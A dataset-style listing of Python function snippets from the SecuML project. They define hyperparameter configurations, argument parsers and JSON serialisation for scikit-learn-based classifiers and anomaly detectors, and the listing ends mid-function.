ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, hyperparam_conf, logger):
    return AlreadyTrainedConf(args.model_exp_id, logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, multiclass, hyperparam_conf, logger):
    SupervisedClassifierConf.__init__(self, multiclass, hyperparam_conf, logger)
    self.accept_sparse = True"
ANSSI-FR/SecuML,_get_model_class,"def _get_model_class(self):
    return DecisionTree"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(multiclass, hyperparam_conf, obj, logger):
    return DecisionTreeConf(multiclass, hyperparam_conf, logger)"
ANSSI-FR/SecuML,is_probabilist,"def is_probabilist(self):
    return True"
ANSSI-FR/SecuML,scoring_function,"def scoring_function(self):
    return None"
ANSSI-FR/SecuML,get_feature_importance,"def get_feature_importance(self):
    return 'score'"
ANSSI-FR/SecuML,_get_hyper_desc,"@staticmethod
def _get_hyper_desc():
    hyper = {}
    hyper['criterion'] = {}
    hyper['criterion']['values'] = {'choices': ['gini', 'entropy'], 'default': ['gini', 'entropy']}
    hyper['splitter'] = {}
    hyper['splitter']['values'] = {'choices': ['best', 'random'], 'default': ['best', 'random']}
    hyper['max_depth'] = {}
    hyper['max_depth']['values'] = {'type': int, 'default': [5, 10, 15, 20, None]}
    hyper['min_samples_split'] = {}
    hyper['min_samples_split']['values'] = {'type': int, 'default': [2]}
    hyper['min_samples_leaf'] = {}
    hyper['min_samples_leaf']['values'] = {'type': int, 'default': [1]}
    hyper['max_features'] = {}
    hyper['max_features']['values'] = {'default': ['sqrt', 'log2', None]}
    hyper['max_leaf_nodes'] = {}
    hyper['max_leaf_nodes']['values'] = {'type': int, 'default': [None]}
    hyper['min_impurity_decrease'] = {}
    hyper['min_impurity_decrease']['values'] = {'type': int, 'default': [0]}
    return hyper"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    SupervisedClassifierConf.gen_parser(parser, DecisionTreeConf)"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, hyperparam_conf, logger):
    return DecisionTreeConf(args.multiclass, hyperparam_conf, logger)"
ANSSI-FR/SecuML,_get_model_class,"def _get_model_class(self):
    return EllipticEnvelope"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(multiclass, hyperparam_conf, obj, logger):
    return EllipticEnvelopeConf(hyperparam_conf, logger)"
ANSSI-FR/SecuML,is_probabilist,"def is_probabilist(self):
    return False"
ANSSI-FR/SecuML,get_feature_importance,"def get_feature_importance(self):
    return None"
ANSSI-FR/SecuML,scoring_function,"def scoring_function(self):
    return 'decision_function'"
ANSSI-FR/SecuML,_get_hyper_desc,"@staticmethod
def _get_hyper_desc():
    hyper = {}
    hyper['contamination'] = {}
    hyper['contamination']['values'] = {'type': float, 'default': 0.1}
    return hyper"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    UnsupervisedClassifierConf.gen_parser(parser, EllipticEnvelopeConf)"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, hyperparam_conf, logger):
    return EllipticEnvelopeConf(hyperparam_conf, logger)"
ANSSI-FR/SecuML,_get_model_class,"def _get_model_class(self):
    return GaussianNaiveBayes"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(multiclass, hyperparam_conf, obj, logger):
    return GaussianNaiveBayesConf(multiclass, hyperparam_conf, logger)"
ANSSI-FR/SecuML,is_probabilist,"def is_probabilist(self):
    return True"
ANSSI-FR/SecuML,scoring_function,"def scoring_function(self):
    return None"
ANSSI-FR/SecuML,get_feature_importance,"def get_feature_importance(self):
    return None"
ANSSI-FR/SecuML,_get_hyper_desc,"@staticmethod
def _get_hyper_desc():
    return None"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    SupervisedClassifierConf.gen_parser(parser, GaussianNaiveBayesConf)"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, hyperparam_conf, logger):
    return GaussianNaiveBayesConf(args.multiclass, hyperparam_conf, logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, multiclass, hyperparam_conf, logger):
    SupervisedClassifierConf.__init__(self, multiclass, hyperparam_conf, logger)
    self.accept_sparse = True"
ANSSI-FR/SecuML,_get_model_class,"def _get_model_class(self):
    return GradientBoosting"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(multiclass, hyperparam_conf, obj, logger):
    return GradientBoostingConf(multiclass, hyperparam_conf, logger)"
ANSSI-FR/SecuML,is_probabilist,"def is_probabilist(self):
    return True"
ANSSI-FR/SecuML,scoring_function,"def scoring_function(self):
    return 'decision_function'"
ANSSI-FR/SecuML,get_feature_importance,"def get_feature_importance(self):
    return 'score'"
ANSSI-FR/SecuML,_get_hyper_desc,"@staticmethod
def _get_hyper_desc():
    hyper = {}
    hyper['loss'] = {}
    hyper['loss']['values'] = {'choices': ['deviance', 'exponential'], 'default': ['deviance']}
    hyper['learning_rate'] = {}
    hyper['learning_rate']['values'] = {'type': float, 'default': [0.1]}
    hyper['n_estimators'] = {}
    hyper['n_estimators']['values'] = {'type': int, 'default': [100]}
    hyper['criterion'] = {}
    hyper['criterion']['values'] = {'choices': ['mse', 'mae', 'friedman_mse'], 'default': ['friedman_mse']}
    hyper['max_depth'] = {}
    hyper['max_depth']['values'] = {'type': int, 'default': [3, 5]}
    hyper['min_samples_split'] = {}
    hyper['min_samples_split']['values'] = {'type': int, 'default': [2]}
    hyper['min_samples_leaf'] = {}
    hyper['min_samples_leaf']['values'] = {'type': int, 'default': [1]}
    hyper['max_features'] = {}
    hyper['max_features']['values'] = {'choices': ['sqrt', 'log2', 'auto'], 'default': ['auto']}
    hyper['max_leaf_nodes'] = {}
    hyper['max_leaf_nodes']['values'] = {'type': int, 'default': [None]}
    hyper['min_impurity_decrease'] = {}
    hyper['min_impurity_decrease']['values'] = {'type': int, 'default': [0]}
    hyper['subsample'] = {}
    hyper['subsample']['values'] = {'type': float, 'default': [0.1]}
    hyper['presort'] = {}
    hyper['presort']['values'] = {'choices': ['auto'], 'default': ['auto']}
    return hyper"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    SupervisedClassifierConf.gen_parser(parser, GradientBoostingConf)"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, hyperparam_conf, logger):
    return GradientBoostingConf(args.multiclass, hyperparam_conf, logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, hyper_conf, logger, n_jobs=-1):
    UnsupervisedClassifierConf.__init__(self, hyper_conf, logger)
    self.accept_sparse = True
    self.n_jobs = n_jobs"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    n_estimators = self.hyperparam_conf.values.n_estimators.values[0]
    return '%s_%iestimators' % (self.model_class_name, n_estimators)"
ANSSI-FR/SecuML,_get_model_class,"def _get_model_class(self):
    return IsolationForest"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = UnsupervisedClassifierConf.fields_to_export(self)
    fields.append(('n_jobs', exportFieldMethod.primitive))
    return fields"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(multiclass, hyperparam_conf, obj, logger):
    return IsolationForestConf(hyperparam_conf, logger, n_jobs=obj['n_jobs'])"
ANSSI-FR/SecuML,is_probabilist,"def is_probabilist(self):
    return False"
ANSSI-FR/SecuML,get_feature_importance,"def get_feature_importance(self):
    return None"
ANSSI-FR/SecuML,scoring_function,"def scoring_function(self):
    return 'decision_function'"
ANSSI-FR/SecuML,_get_hyper_desc,"@staticmethod
def _get_hyper_desc():
    hyper = {}
    hyper['n_estimators'] = {}
    hyper['n_estimators']['values'] = {'type': int, 'default': 100}
    hyper['max_samples'] = {}
    hyper['max_samples']['values'] = {'type': str, 'default': 'auto'}
    hyper['max_features'] = {}
    hyper['max_features']['values'] = {'type': float, 'default': 1.0}
    return hyper"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    UnsupervisedClassifierConf.gen_parser(parser, IsolationForestConf)
    parser.add_argument('--n-jobs', type=int, default=-1, help='Number of CPU cores used to train the model. If given a value of -1, all cores are used. Default: -1.')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, hyperparam_conf, logger):
    return IsolationForestConf(hyperparam_conf, logger, n_jobs=args.n_jobs)"
ANSSI-FR/SecuML,__init__,"def __init__(self, multiclass, hyper_conf, logger, n_jobs=-1):
    SemiSupervisedClassifierConf.__init__(self, multiclass, hyper_conf, logger)
    self.n_jobs = n_jobs"
ANSSI-FR/SecuML,_get_model_class,"def _get_model_class(self):
    return LabelPropagation"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = SemiSupervisedClassifierConf.fields_to_export(self)
    fields.append(('n_jobs', exportFieldMethod.primitive))
    return fields"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(multiclass, hyperparam_conf, obj, logger):
    return LabelPropagationConf(multiclass, hyperparam_conf, logger, n_jobs=obj['n_jobs'])"
ANSSI-FR/SecuML,is_probabilist,"def is_probabilist(self):
    return True"
ANSSI-FR/SecuML,get_feature_importance,"def get_feature_importance(self):
    return None"
ANSSI-FR/SecuML,_get_hyper_desc,"@staticmethod
def _get_hyper_desc():
    hyper = {}
    hyper['kernel'] = {}
    hyper['kernel']['values'] = {'type': str, 'choices': ['rbf', 'knn'], 'default': 'rbf'}
    hyper['n_neighbors'] = {}
    hyper['n_neighbors']['values'] = {'type': int, 'default': 7}
    hyper['gamma'] = {}
    hyper['gamma']['values'] = {'type': float, 'default': 20.0}
    return hyper"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    SemiSupervisedClassifierConf.gen_parser(parser, LabelPropagationConf)
    parser.add_argument('--n-jobs', type=int, default=-1, help='Number of CPU cores used to train the model. If given a value of -1, all cores are used. Default: -1.')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, hyperparam_conf, logger):
    return LabelPropagationConf(args.multiclass, hyperparam_conf, logger, n_jobs=args.n_jobs)"
ANSSI-FR/SecuML,__init__,"def __init__(self, hyper_conf, logger, n_jobs=-1):
    UnsupervisedClassifierConf.__init__(self, hyper_conf, logger)
    self.n_jobs = n_jobs"
ANSSI-FR/SecuML,_get_model_class,"def _get_model_class(self):
    return Lof"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = UnsupervisedClassifierConf.fields_to_export(self)
    fields.append(('n_jobs', exportFieldMethod.primitive))
    return fields"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(multiclass, hyperparam_conf, obj, logger):
    return LofConf(hyperparam_conf, logger, n_jobs=obj['n_jobs'])"
ANSSI-FR/SecuML,is_probabilist,"def is_probabilist(self):
    return False"
ANSSI-FR/SecuML,get_feature_importance,"def get_feature_importance(self):
    return None"
ANSSI-FR/SecuML,_get_hyper_desc,"@staticmethod
def _get_hyper_desc():
    hyper = {}
    hyper['n_neighbors'] = {}
    hyper['n_neighbors']['values'] = {'type': int, 'default': 20}
    hyper['algorithm'] = {}
    hyper['algorithm']['values'] = {'type': str, 'choices': ['auto', 'ball_tree', 'kd_tree', 'brute'], 'default': 'auto'}
    hyper['leaf_size'] = {}
    hyper['leaf_size']['values'] = {'type': int, 'default': 30}
    hyper['metric'] = {}
    hyper['metric']['values'] = {'type': str, 'choices': ['minkowski', 'cityblock', 'l1', 'l2', 'cosine', 'manhattan', 'euclidean'], 'default': 'minkowski'}
    hyper['contamination'] = {}
    hyper['contamination']['values'] = {'type': float, 'default': 0.1}
    return hyper"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    UnsupervisedClassifierConf.gen_parser(parser, LofConf)
    parser.add_argument('--n-jobs', type=int, default=-1, help='Number of CPU cores used to train the model. If given a value of -1, all cores are used. Default: -1.')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, hyperparam_conf, logger):
    return LofConf(hyperparam_conf, logger, n_jobs=args.n_jobs)"
ANSSI-FR/SecuML,__init__,"def __init__(self, multiclass, hyper_conf, logger, optim_algo='liblinear'):
    SupervisedClassifierConf.__init__(self, multiclass, hyper_conf, logger)
    self.optim_algo = optim_algo"
ANSSI-FR/SecuML,_get_model_class,"def _get_model_class(self):
    return LogisticRegression"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    name = SupervisedClassifierConf.get_exp_name(self)
    name += '__%s' % self.optim_algo
    return name"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = SupervisedClassifierConf.fields_to_export(self)
    fields.append(('optim_algo', exportFieldMethod.primitive))
    return fields"
ANSSI-FR/SecuML,is_probabilist,"def is_probabilist(self):
    return True"
ANSSI-FR/SecuML,scoring_function,"def scoring_function(self):
    return 'decision_function'"
ANSSI-FR/SecuML,get_feature_importance,"def get_feature_importance(self):
    return 'weight'"
ANSSI-FR/SecuML,_get_hyper_desc,"@staticmethod
def _get_hyper_desc():
    hyper = {}
    hyper['regularization'] = {}
    hyper['regularization']['values'] = {'type': float, 'default': list(10.0 ** np.arange(-2, 2))}
    hyper['regularization']['sklearn_name'] = 'C'
    hyper['penalty'] = {}
    hyper['penalty']['values'] = {'choices': ['l1', 'l2'], 'default': ['l1', 'l2']}
    return hyper"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    SupervisedClassifierConf.gen_parser(parser, LogisticRegressionConf)
    parser.add_argument('--optim-algo', choices=['liblinear', 'lbfgs', 'sag', 'saga'], default='liblinear', help='sag and saga are recommended for large datasets. Default: liblinear.')"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(multiclass, hyperparam_conf, obj, logger):
    return LogisticRegressionConf(multiclass, hyperparam_conf, logger, optim_algo=obj['optim_algo'])"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, hyperparam_conf, logger):
    optim_algo = 'liblinear'
    if hasattr(args, 'optim_algo'):
        optim_algo = args.optim_algo
    return LogisticRegressionConf(args.multiclass, hyperparam_conf, logger, optim_algo=optim_algo)"
ANSSI-FR/SecuML,_get_model_class,"def _get_model_class(self):
    return OneClassSvm"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(multiclass, hyperparam_conf, obj, logger):
    return OneClassSvmConf(hyperparam_conf, logger)"
ANSSI-FR/SecuML,is_probabilist,"def is_probabilist(self):
    return False"
ANSSI-FR/SecuML,get_feature_importance,"def get_feature_importance(self):
    return None"
ANSSI-FR/SecuML,scoring_function,"def scoring_function(self):
    return 'decision_function'"
ANSSI-FR/SecuML,_get_hyper_desc,"@staticmethod
def _get_hyper_desc():
    hyper = {}
    hyper['kernel'] = {}
    hyper['kernel']['values'] = {'type': str, 'choices': ['rbf', 'linear', 'poly', 'sigmoid'], 'default': 'rbf'}
    hyper['degree'] = {}
    hyper['degree']['values'] = {'type': int, 'default': 3}
    hyper['nu'] = {}
    hyper['nu']['values'] = {'type': float, 'default': 0.5}
    return hyper"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    UnsupervisedClassifierConf.gen_parser(parser, OneClassSvmConf)"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, hyperparam_conf, logger):
    return OneClassSvmConf(hyperparam_conf, logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, multiclass, hyperparam_conf, logger):
    SupervisedClassifierConf.__init__(self, multiclass, hyperparam_conf, logger)
    self.accept_sparse = True"
ANSSI-FR/SecuML,_get_model_class,"def _get_model_class(self):
    return RandomForest"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(multiclass, hyperparam_conf, obj, logger):
    return RandomForestConf(multiclass, hyperparam_conf, logger)"
ANSSI-FR/SecuML,is_probabilist,"def is_probabilist(self):
    return True"
ANSSI-FR/SecuML,scoring_function,"def scoring_function(self):
    return None"
ANSSI-FR/SecuML,get_feature_importance,"def get_feature_importance(self):
    return 'score'"
ANSSI-FR/SecuML,_get_hyper_desc,"@staticmethod
def _get_hyper_desc():
    hyper = {}
    hyper['n_estimators'] = {}
    hyper['n_estimators']['values'] = {'type': int, 'default': [100]}
    hyper['criterion'] = {}
    hyper['criterion']['values'] = {'choices': ['gini', 'entropy'], 'default': ['gini']}
    hyper['max_depth'] = {}
    hyper['max_depth']['values'] = {'type': int, 'default': [None]}
    hyper['min_samples_split'] = {}
    hyper['min_samples_split']['values'] = {'type': int, 'default': [2]}
    hyper['min_samples_leaf'] = {}
    hyper['min_samples_leaf']['values'] = {'type': int, 'default': [1]}
    hyper['max_features'] = {}
    hyper['max_features']['values'] = {'choices': ['sqrt', 'log2'], 'default': ['sqrt']}
    hyper['max_leaf_nodes'] = {}
    hyper['max_leaf_nodes']['values'] = {'type': int, 'default': [None]}
    hyper['min_impurity_decrease'] = {}
    hyper['min_impurity_decrease']['values'] = {'type': int, 'default': [0]}
    hyper['bootstrap'] = {}
    hyper['bootstrap']['values'] = {'type': bool, 'default': [False]}
    hyper['oob_score'] = {}
    hyper['oob_score']['values'] = {'type': bool, 'default': [False]}
    return hyper"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    SupervisedClassifierConf.gen_parser(parser, RandomForestConf)"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, hyperparam_conf, logger):
    return RandomForestConf(args.multiclass, hyperparam_conf, logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, hyperparam_conf, logger, nu_u=1.0, nu_l=1.0, kappa=1.0):
    SemiSupervisedClassifierConf.__init__(self, False, hyperparam_conf, logger)
    self.nu_u = nu_u
    self.nu_l = nu_l
    self.kappa = kappa"
ANSSI-FR/SecuML,_get_model_class,"def _get_model_class(self):
    return Sssvdd"
ANSSI-FR/SecuML,is_probabilist,"def is_probabilist(self):
    return False"
ANSSI-FR/SecuML,scoring_function,"def scoring_function(self):
    return 'decision_function'"
ANSSI-FR/SecuML,get_feature_importance,"def get_feature_importance(self):
    return None"
ANSSI-FR/SecuML,_get_hyper_desc,"@staticmethod
def _get_hyper_desc():
    return None"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = SemiSupervisedClassifierConf.fields_to_export(self)
    fields.append(('nu_u', exportFieldMethod.primitive))
    fields.append(('nu_l', exportFieldMethod.primitive))
    fields.append(('kappa', exportFieldMethod.primitive))
    return fields"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(multiclass, hyperparam_conf, obj, logger):
    return SssvddConf(hyperparam_conf, logger, nu_u=obj['nu_u'], nu_l=obj['nu_l'], kappa=obj['kappa'])"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    SemiSupervisedClassifierConf.gen_parser(parser, SssvddConf, multiclass=False)
    parser.add_argument('--nu-l', type=float, default=1.0, help='Default: 1.0')
    parser.add_argument('--nu-u', type=float, default=1.0, help='Default: 1.0')
    parser.add_argument('--kappa', type=float, default=1.0, help='Default: 1.0')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, hyperparam_conf, logger):
    nu_u = args.nu_u if hasattr(args, 'nu_u') else 1.0
    nu_l = args.nu_l if hasattr(args, 'nu_l') else 1.0
    kappa = args.kappa if hasattr(args, 'kappa') else 1.0
    return SssvddConf(hyperparam_conf, logger, nu_u=nu_u, nu_l=nu_l, kappa=kappa)"
ANSSI-FR/SecuML,_get_model_class,"def _get_model_class(self):
    return Svc"
ANSSI-FR/SecuML,is_probabilist,"def is_probabilist(self):
    return True"
ANSSI-FR/SecuML,scoring_function,"def scoring_function(self):
    return 'decision_function'"
ANSSI-FR/SecuML,get_feature_importance,"def get_feature_importance(self):
    return None"
ANSSI-FR/SecuML,_get_hyper_desc,"@staticmethod
def _get_hyper_desc():
    hyper = {}
    hyper['regularization'] = {}
    hyper['regularization']['values'] = {'type': float, 'default': list(10.0 ** np.arange(-2, 2))}
    hyper['regularization']['sklearn_name'] = 'C'
    return hyper"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    SupervisedClassifierConf.gen_parser(parser, SvcConf)"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, hyperparam_conf, logger):
    return SvcConf(args.multiclass, hyperparam_conf, logger)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(multiclass, hyperparam_conf, obj, logger):
    return SvcConf(multiclass, hyperparam_conf, logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, hyper_conf, logger, n_jobs=-1):
    SemiSupervisedClassifierConf.__init__(self, False, hyper_conf, logger)
    self.accept_sparse = True
    self.n_jobs = n_jobs"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    n_estimators = self.hyperparam_conf.values.n_estimators.values[0]
    return '%s_%iestimators' % (self.model_class_name, n_estimators)"
ANSSI-FR/SecuML,_get_model_class,"def _get_model_class(self):
    return WeightedIsolationForest"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    fields = SemiSupervisedClassifierConf.fields_to_export(self)
    fields.append(('n_jobs', exportFieldMethod.primitive))
    return fields"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(multiclass, hyperparam_conf, obj, logger):
    return WeightedIsolationForestConf(hyperparam_conf, logger, n_jobs=obj['n_jobs'])"
ANSSI-FR/SecuML,is_probabilist,"def is_probabilist(self):
    return False"
ANSSI-FR/SecuML,get_feature_importance,"def get_feature_importance(self):
    return None"
ANSSI-FR/SecuML,scoring_function,"def scoring_function(self):
    return 'decision_function'"
ANSSI-FR/SecuML,_get_hyper_desc,"@staticmethod
def _get_hyper_desc():
    hyper = {}
    hyper['eta'] = {}
    hyper['eta']['values'] = {'type': float, 'default': 1.0}
    hyper['n_estimators'] = {}
    hyper['n_estimators']['values'] = {'type': int, 'default': 100}
    hyper['max_samples'] = {}
    hyper['max_samples']['values'] = {'type': str, 'default': 'auto'}
    hyper['max_features'] = {}
    hyper['max_features']['values'] = {'type': float, 'default': 1.0}
    return hyper"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser):
    SemiSupervisedClassifierConf.gen_parser(parser, WeightedIsolationForestConf, multiclass=False)
    parser.add_argument('--n-jobs', type=int, default=-1, help='Number of CPU cores used to train the model. If given a value of -1, all cores are used. Default: -1.')"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, hyperparam_conf, logger):
    return WeightedIsolationForestConf(hyperparam_conf, logger, n_jobs=args.n_jobs)"
ANSSI-FR/SecuML,get_model_hyperparam_desc,"def get_model_hyperparam_desc(model_class):
    if model_class is None:
        return None
    return model_class._get_hyper_desc()"
ANSSI-FR/SecuML,__init__,"def __init__(self, values, optim_conf, logger):
    Conf.__init__(self, logger)
    self.values = values
    self.optim_conf = optim_conf"
ANSSI-FR/SecuML,get_param_grid,"def get_param_grid(self):
    if self.values is None:
        return None
    return self.values.get_param_grid()"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    return [('optim_conf', exportFieldMethod.obj), ('values', exportFieldMethod.obj)]"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser, model_class, cv_optim, subgroup=True):
    hyperparam_desc = get_model_hyperparam_desc(model_class)
    Hyperparams.gen_parser(parser, hyperparam_desc, cv_optim, subgroup=subgroup)
    if cv_optim:
        OptimConf.gen_parser(parser, subgroup=subgroup)"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, model_class, cv_optim, logger):
    optim_conf = None
    if cv_optim:
        optim_conf = OptimConf.from_args(args, logger)
    model_class._check_hyper_args(args)
    hyperparam_desc = get_model_hyperparam_desc(model_class)
    values = Hyperparams.from_args(args, hyperparam_desc, cv_optim, logger)
    return HyperparamConf(values, optim_conf, logger)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, model_class, logger):
    if obj is None:
        return None
    optim_conf = OptimConf.from_json(obj['optim_conf'], logger)
    hyperparam_desc = get_model_hyperparam_desc(model_class)
    values = Hyperparams.from_json(obj['values'], hyperparam_desc, logger)
    return HyperparamConf(values, optim_conf, logger)"
ANSSI-FR/SecuML,get_default,"@staticmethod
def get_default(num_folds, n_jobs, multiclass, model_class, logger):
    optim_conf = OptimConf.get_default(num_folds, n_jobs, multiclass, logger)
    hyperparam_desc = get_model_hyperparam_desc(model_class)
    values = Hyperparams.get_default(hyperparam_desc, logger)
    return HyperparamConf(values, optim_conf, logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, num_folds, n_jobs, obj_func, logger):
    Conf.__init__(self, logger)
    self.num_folds = num_folds
    self.n_jobs = n_jobs
    self.objective_func = obj_func"
ANSSI-FR/SecuML,get_scoring_method,"def get_scoring_method(self):
    return self.objective_func.get_scoring_method()"
ANSSI-FR/SecuML,get_exp_name,"def get_exp_name(self):
    return ''"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    return [('num_folds', exportFieldMethod.primitive), ('n_jobs', exportFieldMethod.primitive), ('objective_func', exportFieldMethod.obj)]"
ANSSI-FR/SecuML,gen_parser,"@staticmethod
def gen_parser(parser, subgroup=True):
    group = parser
    if subgroup:
        group = parser.add_argument_group('Hyperparameters optimization')
    group.add_argument('--n-jobs', type=int, default=-1, help='Number of CPU cores used when parallelizing the cross validation looking for the best hyper-parameters. If given a value of -1, all cores are used. Default: -1.')
    group.add_argument('--num-folds', type=int, default=4, help='Number of folds built in the cross validation looking for the best hyper-parameters. Default: 4.')
    ObjectiveFuncConf.gen_parser(group)"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    if obj is None:
        return None
    factory = objective_func.get_factory()
    obj_func_conf = factory.from_json(obj['objective_func'], logger)
    return OptimConf(obj['num_folds'], obj['n_jobs'], obj_func_conf, logger)"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, logger):
    factory = objective_func.get_factory()
    if args.multiclass:
        obj_func_conf = factory.from_args('Accuracy', args, logger)
    else:
        obj_func_conf = factory.from_args(args.objective_func, args, logger)
    return OptimConf(args.num_folds, args.n_jobs, obj_func_conf, logger)"
ANSSI-FR/SecuML,get_default,"@staticmethod
def get_default(num_folds, n_jobs, multiclass, logger):
    if num_folds is None:
        num_folds = 4
    if n_jobs is None:
        n_jobs = 1
    if multiclass:
        scoring = AccuracyConf
    else:
        scoring = RocAucConf
    return OptimConf(num_folds, n_jobs, scoring(logger), logger)"
ANSSI-FR/SecuML,__init__,"def __init__(self, logger):
    Conf.__init__(self, logger)
    self._hyper_values = set([])"
ANSSI-FR/SecuML,add,"def add(self, name, hyper_values):
    setattr(self, name, hyper_values)
    self._hyper_values.add(name)"
ANSSI-FR/SecuML,get_param_grid,"def get_param_grid(self):
    return {'model__' + getattr(self, p).sklearn_name: getattr(self, p).values for p in self._hyper_values}"
ANSSI-FR/SecuML,set_best_values,"def set_best_values(self, grid_search):
    best_params = grid_search.best_params_
    for p in self._hyper_values:
        param = getattr(self, p)
        param.set_best_value(best_params['model__' + param.sklearn_name])"
ANSSI-FR/SecuML,get_best_values,"def get_best_values(self):
    return {'model__' + getattr(self, p).sklearn_name: getattr(self, p).best_value for p in self._hyper_values}"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
    return [(p, exportFieldMethod.obj) for p in self._hyper_values]"
ANSSI-FR/SecuML,gen_parser,"def gen_parser(parser, hyperparam_desc, cv_optim, subgroup=True):
    if hyperparam_desc is None:
        return
    group = parser
    if subgroup:
        group = parser.add_argument_group('Hyperparameters')
    sklearn_mess = 'See the scikit-learn documentation.'
    for (p, params) in hyperparam_desc.items():
        if cv_optim:
            params['nargs'] = '+'
            params['help'] = '%s Default value: [%s].' % (sklearn_mess, ', '.join(map(str, params['values']['default'])))
        else:
            params['nargs'] = None
            params['help'] = '%s Default value: %s.' % (sklearn_mess, str(params['values']['default']))
        p = p.replace('_', '-')
        group.add_argument('--%s' % p, help=params['help'], nargs=params['nargs'], **params['values'])"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, hyperparam_desc, cv_optim, logger):
    if hyperparam_desc is None:
        return None
    hyper_values = Hyperparams(logger)
    for (p, params) in hyperparam_desc.items():
        hyper_values.add(p, HyperparamValues.from_args(args, p, params, cv_optim, logger))
    return hyper_values"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, hyperparam_desc, logger):
    if hyperparam_desc is None:
        return None
    hyper_values = Hyperparams(logger)
    for p in hyperparam_desc:
        hyper_values.add(p, HyperparamValues.from_json(obj[p], logger))
    return hyper_values"
ANSSI-FR/SecuML,get_default,"@staticmethod
def get_default(hyperparam_desc, logger):
    if hyperparam_desc is None:
        return None
    hyper_values = Hyperparams(logger)
    for (p, params) in hyperparam_desc.items():
        sklearn_name = p
        if 'sklearn_name' in params:
            sklearn_name = params['sklearn_name']
        hyper_values.add(p, HyperparamValues(params['values']['default'], sklearn_name, logger))
    return hyper_values"
ANSSI-FR/SecuML,__init__,"def __init__(self, values, sklearn_name, logger):
    Conf.__init__(self, logger)
    self.values = values
    self.sklearn_name = sklearn_name
    self.best_value = None"
ANSSI-FR/SecuML,set_best_value,"def set_best_value(self, best_value):
    self.best_value = best_value"
ANSSI-FR/SecuML,from_json,"@staticmethod
def from_json(obj, logger):
    conf = HyperparamValues(obj['values'], obj['sklearn_name'], logger)
    conf.set_best_value(obj['best_value'])
    return conf"
ANSSI-FR/SecuML,from_args,"@staticmethod
def from_args(args, name, param, cv_optim, logger):
    sklearn_name = name
    if 'sklearn_name' in param:
        sklearn_name = param['sklearn_name']
    if name in vars(args):
        values = vars(args)[name]
    else:
        values = param['values']['default']
    if not cv_optim:
        values = [values]
    hyper_values = HyperparamValues(values, sklearn_name, logger)
    if not cv_optim:
        hyper_values.set_best_value(values[0])
    return hyper_values"
ANSSI-FR/SecuML,fields_to_export,"def fields_to_export(self):
